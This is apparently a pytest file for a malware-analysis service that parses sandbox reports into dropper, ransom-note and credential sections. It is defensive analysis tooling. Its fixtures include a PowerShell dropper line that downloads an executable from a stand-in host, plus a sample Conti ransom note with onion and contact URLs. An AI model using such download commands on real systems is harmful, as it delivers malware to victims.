"""Dropper, ransom-note and credential records from behavioral and overview reports."""

import json
import os
from typing import Any
from unittest.mock import MagicMock

import pytest
from conftest import SAMPLE_ID, build_report

from triage_sandbox import service as service_module
from triage_sandbox.evidence import convert_extracted
from triage_sandbox.models import Ransom, clean_text, string_values
from triage_sandbox.report import TriageResult

REPORT_URL = "https://api.tria.ge/v0/samples/{}/{}/report_triage.json"
OVERVIEW_URL = f"https://api.tria.ge/v1/samples/{SAMPLE_ID}/overview.json"
DROPPER = {
    "language": "ps1",
    "source": "powershell -enc AAAA",
    "deobfuscated": "(New-Object Net.WebClient).DownloadFile('https://payload.example.com/a.exe')",
    "urls": [
        {"type": "exe.dropper", "url": "https://payload.example.com/a.exe"},
        {"type": "exe.dropper", "url": "https://payload.example.com/a.exe"},
        {"url": "http://198.51.100.7/b.exe"},
    ],
}


def run(triage_service, make_request, api, extracted, overview=None):
    """Execute the service with `extracted` on behavioral1 and return (request, task, sandbox sections)."""
    report = build_report("behavioral1")
    report["extracted"] = extracted
    api.get(REPORT_URL.format(SAMPLE_ID, "behavioral1"), json=report)
    other = build_report("behavioral2")
    other["extracted"] = []
    api.get(REPORT_URL.format(SAMPLE_ID, "behavioral2"), json=other)
    api.get(OVERVIEW_URL, json=overview or {})
    request = make_request()
    triage_service.execute(request)
    sandbox = request.result.sections[0]
    task = next(s for s in sandbox.subsections if s.title_text.startswith("Task: behavioral1 "))
    return request, task, sandbox


def titled(section, title):
    return next(s for s in section.subsections if s.title_text == title)


def test_dropper_section_keeps_typed_urls_context_and_static_tags(triage_service, make_request, mock_triage_api):
    item = {"dropper": DROPPER, "resource": "behavioral1/files/x.dat", "path": "C:\\x.ps1"}
    request, task, _ = run(triage_service, make_request, mock_triage_api, [item])

    section = titled(task, "Dropper (ps1)")
    assert section.heuristic is None
    assert "Path: C:\\x.ps1" in section.body
    assert "Extraction resource: behavioral1/files/x.dat" in section.body
    assert "Tasks: behavioral1" in section.body
    urls = titled(section, "Dropper URLs")
    assert json.loads(urls.body) == [
        {"Type": "exe.dropper", "URL": "https://payload.example.com/a.exe"},
        {"Type": "", "URL": "http://198.51.100.7/b.exe"},
    ]
    assert urls.heuristic is None
    assert set(urls.tags["network.static.uri"]) == {
        "https://payload.example.com/a.exe",
        "http://198.51.100.7/b.exe",
    }
    assert urls.tags["network.static.domain"] == ["payload.example.com"]
    assert urls.tags["network.static.ip"] == ["198.51.100.7"]
    assert titled(section, "Dropper source").body == DROPPER["source"]
    assert titled(section, "Deobfuscated dropper").body == DROPPER["deobfuscated"]
    # Text is evidence, not an artifact: nothing is extracted or downloaded for it.
    request.add_extracted.assert_not_called()
    request.add_supplementary.assert_not_called()


def test_dropper_repeated_in_task_appears_once_with_all_context(triage_service, make_request, mock_triage_api):
    extracted = [{"dropper": DROPPER, "path": "C:\\a"}, {"dropper": DROPPER, "path": "C:\\b"}]
    _, task, _ = run(triage_service, make_request, mock_triage_api, extracted)
    assert sum(s.title_text == "Dropper (ps1)" for s in task.subsections) == 1
    assert "Path: C:\\a, C:\\b" in titled(task, "Dropper (ps1)").body


def test_long_dropper_text_is_bounded_with_one_supplementary_copy(triage_service, make_request, mock_triage_api):
    long_text = "A" * (service_module.MAX_INLINE_TEXT + 10)
    extracted = [
        {"dropper": {"source": long_text, "language": "ps1"}},
        {"dropper": {"source": long_text, "language": "hta"}},
    ]
    request, task, _ = run(triage_service, make_request, mock_triage_api, extracted)

    body = titled(titled(task, "Dropper (ps1)"), "Dropper source").body
    assert f"Showing the first {service_module.MAX_INLINE_TEXT} of {len(long_text)} characters." in body
    assert "A" * (service_module.MAX_INLINE_TEXT + 1) not in body
    assert "Complete text: supplementary file dropper_source_" in body
    assert "Complete text" in titled(titled(task, "Dropper (hta)"), "Dropper source").body
    request.add_supplementary.assert_called_once()
    path, name, _description = request.add_supplementary.call_args.args
    assert os.path.basename(path) == name
    with open(path) as fh:
        assert fh.read() == long_text


def test_supplementary_failure_keeps_preview_and_reports_incomplete(triage_service, make_request, mock_triage_api):
    long_text = "A" * (service_module.MAX_INLINE_TEXT + 1)
    request = MagicMock()
    request.add_supplementary.side_effect = OSError("disk full")
    triage_service._supplementary_names = set()
    section, diagnostic = triage_service._text_section(request, "Dropper source", long_text, "dropper_source")
    assert "Showing the first" in section.body
    assert "Complete text" not in section.body
    assert diagnostic == "Dropper source: complete text could not be retained."


def test_text_section_diagnostic_reaches_completeness(triage_service, make_request, mock_triage_api, monkeypatch):
    monkeypatch.setattr(service_module, "MAX_INLINE_TEXT", 3)
    report_item = {"dropper": {"source": "long source"}}
    report = build_report("behavioral1")
    report["extracted"] = [report_item]
    mock_triage_api.get(REPORT_URL.format(SAMPLE_ID, "behavioral1"), json=report)
    request = make_request()
    request.add_supplementary.side_effect = OSError("disk full")
    triage_service.execute(request)
    completeness = titled(request.result.sections[0], "Analysis completeness")
    assert "Dropper source: complete text could not be retained." in completeness.body


@pytest.mark.parametrize(
    "record",
    [{"language": "ps1"}, {"urls": [{"type": "exe.dropper"}, "bad"]}, {"urls": "bad", "source": 7}],
)
def test_dropper_without_evidence_is_skipped(record):
    assert convert_extracted({"dropper": record}, "Task t") == ([], [])


def test_convert_extracted_reports_invalid_dropper_and_ignores_non_records():
    assert convert_extracted({"dropper": "bad"}, "Task t") == ([], ["Task t: invalid dropper record."])
    assert convert_extracted("bad", "Task t") == ([], [])


def test_dropper_without_language_or_urls(triage_service, make_request, mock_triage_api):
    _, task, _ = run(triage_service, make_request, mock_triage_api, [{"dropper": {"source": "cmd /c x\x00"}}])
    section = titled(task, "Dropper")
    assert [s.title_text for s in section.subsections] == ["Dropper source"]
    assert section.subsections[0].body == "cmd /c x"


def test_clean_text_rejects_non_text_and_blank_values():
    assert clean_text(None) is None
    assert clean_text(" \x00 ") is None


NOTE: dict[str, Any] = {
    "family": "conti",
    "target": "files",
    "note": "Your files are encrypted\x00",
    "emails": ['href="mailto:help@example.com"', "<h2>help@example.com</h2>", "not-an-address@bad.invalidtld"],
    "urls": [
        "http://abcdefghijklmnop.onion/ticket<",
        "http://www.w3.org/TR/html4/strict.dtd'>",
        "http-equiv=x",
        "http://host.invalidtld/",
    ],
    "contact": ["Email: other@example.com", "Site https://contact.example.com/a."],
    "wallets": ["w1", "w1"],
}


def test_ransom_section_shows_note_and_normalized_contacts(triage_service, make_request, mock_triage_api):
    item = {"ransom_note": NOTE, "path": "C:\\a\\note.txt", "resource": "behavioral1/files/n.dat"}
    request, task, _ = run(triage_service, make_request, mock_triage_api, [item])

    section = titled(task, "Ransom note (CONTI)")
    assert section.heuristic is None
    assert section.tags["attribution.family"] == ["CONTI"]
    assert "Target: files" in section.body
    assert "Path: C:\\a\\note.txt" in section.body
    assert titled(section, "Ransom note text").body == "Your files are encrypted"
    assert titled(section, "Ransom note text").auto_collapse is False
    contacts = titled(section, "Contact and payment details")
    rows = {(row["Type"], row["Value"]): row["Indicator"] for row in json.loads(contacts.body)}
    assert rows[("Email", NOTE["emails"][0])] == "help@example.com"
    assert rows[("Email", "not-an-address@bad.invalidtld")] == ""
    assert rows[("URL", "http://abcdefghijklmnop.onion/ticket<")] == "http://abcdefghijklmnop.onion/ticket"
    assert rows[("URL", "http://www.w3.org/TR/html4/strict.dtd'>")] == ""
    assert rows[("URL", "http://host.invalidtld/")] == ""
    assert rows[("Contact", "Email: other@example.com")] == "other@example.com"
    assert rows[("Contact", "Site https://contact.example.com/a.")] == "https://contact.example.com/a"
    assert rows[("Wallet", "w1")] == ""
    assert sum(key[0] == "Wallet" for key in rows) == 1
    assert set(contacts.tags["network.email.address"]) == {"help@example.com", "other@example.com"}
    assert set(contacts.tags["network.static.uri"]) == {
        "http://abcdefghijklmnop.onion/ticket",
        "https://contact.example.com/a",
    }
    assert "www.w3.org" not in contacts.tags["network.static.domain"]
    request.add_supplementary.assert_not_called()


def test_ransom_malware_config_keeps_wallets_purpose_and_original_context():
    prim = Ransom(**NOTE).create_MalwareConfig().as_primitives(strip_null=True)
    assert [c["address"] for c in prim["cryptocurrency"]] == ["w1"]
    assert prim["http"] == [
        {"uri": "http://abcdefghijklmnop.onion/ticket", "usage": "ransom"},
        {"uri": "https://contact.example.com/a", "usage": "ransom"},
    ]
    assert prim["other"]["note"] == "Your files are encrypted"
    assert prim["other"]["target"] == "files"
    assert prim["other"]["contact"] == NOTE["contact"]
    assert prim["other"]["emails"] == NOTE["emails"]
    assert prim["other"]["urls"] == NOTE["urls"]


def test_ransom_malware_config_without_optional_fields_has_no_other():
    prim = Ransom().create_MalwareConfig().as_primitives(strip_null=True)
    assert prim["family"] == ["UNKNOWN"]
    assert "other" not in prim
    assert "http" not in prim


def test_ransom_without_optional_fields_renders_title_only(triage_service, make_request, mock_triage_api):
    _, task, _ = run(triage_service, make_request, mock_triage_api, [{"ransom_note": {"future_field": 1}}])
    section = titled(task, "Ransom note")
    assert section.subsections == []
    assert "attribution.family" not in section.tags


def test_distinct_notes_stay_separate_and_repeats_merge(triage_service, make_request, mock_triage_api):
    extracted = [
        {"ransom_note": {"note": "first", "family": "conti"}, "path": "C:\\a"},
        {"ransom_note": {"note": "first", "family": "conti"}, "path": "C:\\b"},
        {"ransom_note": {"note": "second", "family": "conti"}, "path": "C:\\c"},
    ]
    _, task, _ = run(triage_service, make_request, mock_triage_api, extracted)
    sections = [s for s in task.subsections if s.title_text == "Ransom note (CONTI)"]
    assert [titled(s, "Ransom note text").body for s in sections] == ["first", "second"]
    assert "Path: C:\\a, C:\\b" in sections[0].body
    result = TriageResult(triage_service.client, triage_service.client.sample_by_id(SAMPLE_ID))
    assert len(result.malware_config) == 2


def test_long_note_is_bounded_with_supplementary_copy(triage_service, make_request, mock_triage_api):
    note = "N" * (service_module.MAX_INLINE_TEXT + 1)
    request, task, _ = run(triage_service, make_request, mock_triage_api, [{"ransom_note": {"note": note}}])
    assert (
        "Complete text: supplementary file ransom_note_" in titled(titled(task, "Ransom note"), "Ransom note text").body
    )
    request.add_supplementary.assert_called_once()


def test_long_note_supplementary_failure_is_reported(triage_service, make_request, mock_triage_api, monkeypatch):
    monkeypatch.setattr(service_module, "MAX_INLINE_TEXT", 3)
    report = build_report("behavioral1")
    report["extracted"] = [{"ransom_note": {"note": "long note"}}]
    mock_triage_api.get(REPORT_URL.format(SAMPLE_ID, "behavioral1"), json=report)
    request = make_request()
    request.add_supplementary.side_effect = OSError("disk full")
    triage_service.execute(request)
    completeness = titled(request.result.sections[0], "Analysis completeness")
    assert "Ransom note text: complete text could not be retained." in completeness.body


def test_string_values_normalizes_untrusted_fields():
    assert string_values("a") == ["a"]
    assert string_values(["a", "a", "", None, 7, "b"]) == ["a", "b"]
    assert string_values(None) == []


CREDENTIALS = {"protocol": "smtp", "host": "smtp.example.com", "port": 587, "username": "u", "password": "p", "flow": 2}


def test_behavioral_credentials_render_and_keep_config_mapping(triage_service, make_request, mock_triage_api):
    item = {"credentials": {**CREDENTIALS, "email_to": "dest@example.com"}}
    _, task, _ = run(triage_service, make_request, mock_triage_api, [item])
    section = titled(task, "Credentials (SMTP)")
    assert section.heuristic is None
    assert json.loads(titled(section, "Recovered credentials").body) == [
        {
            "Protocol": "smtp",
            "Host": "smtp.example.com",
            "Port": 587,
            "Username": "u",
            "Password": "p",
            "Recipients": "dest@example.com",
            "Flow": 2,
        }
    ]
    result = TriageResult(triage_service.client, triage_service.client.sample_by_id(SAMPLE_ID))
    assert result.malware_config[0].smtp[0].hostname == "smtp.example.com"


def overview_only_setup(api, extracted):
    """Neither behavioral report has extracted evidence; only the overview does."""
    for task_id in ("behavioral1", "behavioral2"):
        report = build_report(task_id)
        report["extracted"] = []
        api.get(REPORT_URL.format(SAMPLE_ID, task_id), json=report)
    api.get(OVERVIEW_URL, json={"extracted": extracted})


def test_overview_only_records_appear_with_their_own_context(triage_service, make_request, mock_triage_api):
    overview_only_setup(
        mock_triage_api,
        [
            {"dropper": DROPPER, "tasks": ["behavioral9"], "resource": "behavioral9/files/x"},
            {"ransom_note": {"note": "pay", "family": "conti"}, "path": "C:\\a", "tasks": ["behavioral9"]},
            {"ransom_note": {"note": "pay", "family": "conti"}, "path": "C:\\b", "tasks": ["behavioral8"]},
            {"ransom_note": {"note": "other note"}},
            {"credentials": CREDENTIALS},
        ],
    )
    request = make_request()
    triage_service.execute(request)
    sandbox = request.result.sections[0]
    overview = titled(sandbox, "Overview")
    assert "Tasks: behavioral9" in titled(overview, "Dropper (ps1)").body
    note = titled(overview, "Ransom note (CONTI)")
    assert "Path: C:\\a, C:\\b" in note.body
    assert "Tasks: behavioral9, behavioral8" in note.body
    # A record without upstream task attribution is not assigned one.
    assert titled(overview, "Ransom note").body is None
    assert titled(overview, "Credentials (SMTP)").body is None
    assert not any(s.heuristic for s in overview.subsections)
    result = TriageResult(triage_service.client, triage_service.client.sample_by_id(SAMPLE_ID))
    # Two distinct notes and one credential; a dropper has no MalwareConfig.
    assert len(result.malware_config) == 3


def test_behavioral_and_overview_equivalents_appear_once_with_context(triage_service, make_request, mock_triage_api):
    note = {"note": "pay", "family": "conti", "wallets": ["w1"]}
    behavioral = [
        {"ransom_note": note, "path": "C:\\a"},
        {"dropper": DROPPER},
        {"credentials": CREDENTIALS},
    ]
    overview = {
        "extracted": [
            {"ransom_note": note, "path": "C:\\a", "tasks": ["behavioral1", "behavioral7"]},
            {"dropper": DROPPER, "tasks": ["behavioral1"]},
            # Flow numbers are per task, so this is the same credential seen elsewhere.
            {"credentials": {**CREDENTIALS, "flow": 9}, "tasks": ["behavioral2"]},
        ]
    }
    request, task, sandbox = run(triage_service, make_request, mock_triage_api, behavioral, overview)
    assert not any(s.title_text == "Overview" for s in sandbox.subsections)
    # Tasks with a report are identified by their label; others keep the upstream name.
    labels = TriageResult(triage_service.client, triage_service.client.sample_by_id(SAMPLE_ID)).task_label
    assert f"Tasks: {labels('behavioral1')}, behavioral7" in titled(task, "Ransom note (CONTI)").body
    assert f"Tasks: {labels('behavioral1')}, {labels('behavioral2')}" in titled(task, "Credentials (SMTP)").body
    result = TriageResult(triage_service.client, triage_service.client.sample_by_id(SAMPLE_ID))
    assert result.overview_evidence == {}
    assert len(result.malware_config) == 2
    assert [c.address for c in result.malware_config[0].cryptocurrency] == ["w1"]


def test_malformed_overview_records_keep_unrelated_evidence(triage_service, make_request, mock_triage_api):
    overview_only_setup(
        mock_triage_api,
        [
            "bad",
            {"dropper": "bad"},
            {"ransom_note": {"family": 7}},
            {"credentials": {"username": "missing protocol"}},
            {"credentials": {"protocol": "imap"}},
            {"ransom_note": {"note": "kept"}},
        ],
    )
    request = make_request()
    triage_service.execute(request)
    sandbox = request.result.sections[0]
    assert titled(titled(titled(sandbox, "Overview"), "Ransom note"), "Ransom note text").body == "kept"
    completeness = titled(sandbox, "Analysis completeness").body
    assert "Overview: invalid dropper record." in completeness
    assert "Overview: invalid ransom note (AttributeError)." in completeness
    assert "Overview: invalid credentials (TypeError)." in completeness
    assert "Overview: skipped credentials with no supported content." in completeness


def test_overview_evidence_prevents_failure_when_reports_cannot_parse(triage_client, requests_mock):
    for task_id in ("behavioral1", "behavioral2"):
        requests_mock.get(REPORT_URL.format(SAMPLE_ID, task_id), json={"sample": {}})
    requests_mock.get(OVERVIEW_URL, json={"extracted": [{"credentials": CREDENTIALS}]})
    result = TriageResult(triage_client, triage_client.sample_by_id(SAMPLE_ID))
    assert result.sample.task_reports == []
    assert len(result.overview_evidence) == 1
    assert len(result.malware_config) == 1
